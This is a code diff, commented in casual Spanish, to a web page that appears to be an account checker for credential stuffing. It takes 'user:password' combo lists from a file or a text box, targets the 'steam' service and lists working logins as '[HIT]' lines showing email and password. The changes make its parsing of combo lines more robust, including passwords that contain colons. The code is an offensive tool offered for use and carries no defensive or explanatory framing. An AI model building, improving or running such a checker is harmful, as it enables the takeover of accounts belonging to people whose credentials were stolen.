@@ -37,7 +37,6 @@
 
     <p>Subí tu archivo .txt o pegá las cuentas acá:</p>
     
-    <!-- BOTÓN PA SUBIR ARCHIVO -->
     <label for="fileInput" class="file-label">SUBIR ARCHIVO .TXT</label>
     <input type="file" id="fileInput" accept=".txt">
     
@@ -66,7 +65,6 @@
         let currentService = 'steam';
         let hitsArray = [];
 
-        // LÓGICA PA LEER EL ARCHIVO TXT
         document.getElementById('fileInput').addEventListener('change', function(e) {
             const file = e.target.files[0];
             if (!file) return;
@@ -86,7 +84,20 @@
             const text = document.getElementById('combosInput').value.trim();
             if (!text) return alert("Poné algo, AGENT man.");
             
-            const lines = text.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
+            // LIMPIEZA DE ESPACIOS EN BLANCO
+            const rawLines = text.split('\n');
+            const lines = [];
+            for (let line of rawLines) {
+                if (!line.includes(':')) continue;
+                // Separa por los dos puntos y limpia los espacios de ambos lados
+                const parts = line.split(':');
+                const user = parts[0].trim();
+                const pass = parts.slice(1).join(':').trim(); // El slice por si la clave tiene ":"
+                if (user && pass) {
+                    lines.push(`${user}:${pass}`);
+                }
+            }
+
             const total = lines.length;
             if (total === 0) return alert("Formato incorrecto. Usá usuario:contraseña");
 
@@ -110,7 +121,7 @@
                     
                     if (data.results && data.results[0]) {
                         const r = data.results[0];
-                        const userPass = `${r.email}:${combo.split(':')[1]}`;
+                        const userPass = `${r.email}:${combo.split(':').slice(1).join(':')}`;
                         
                         if (r.valid) {
                             document.getElementById('hitList').innerHTML += `<div class="hit">[HIT] ${userPass} | ${r.reason}</div>`;
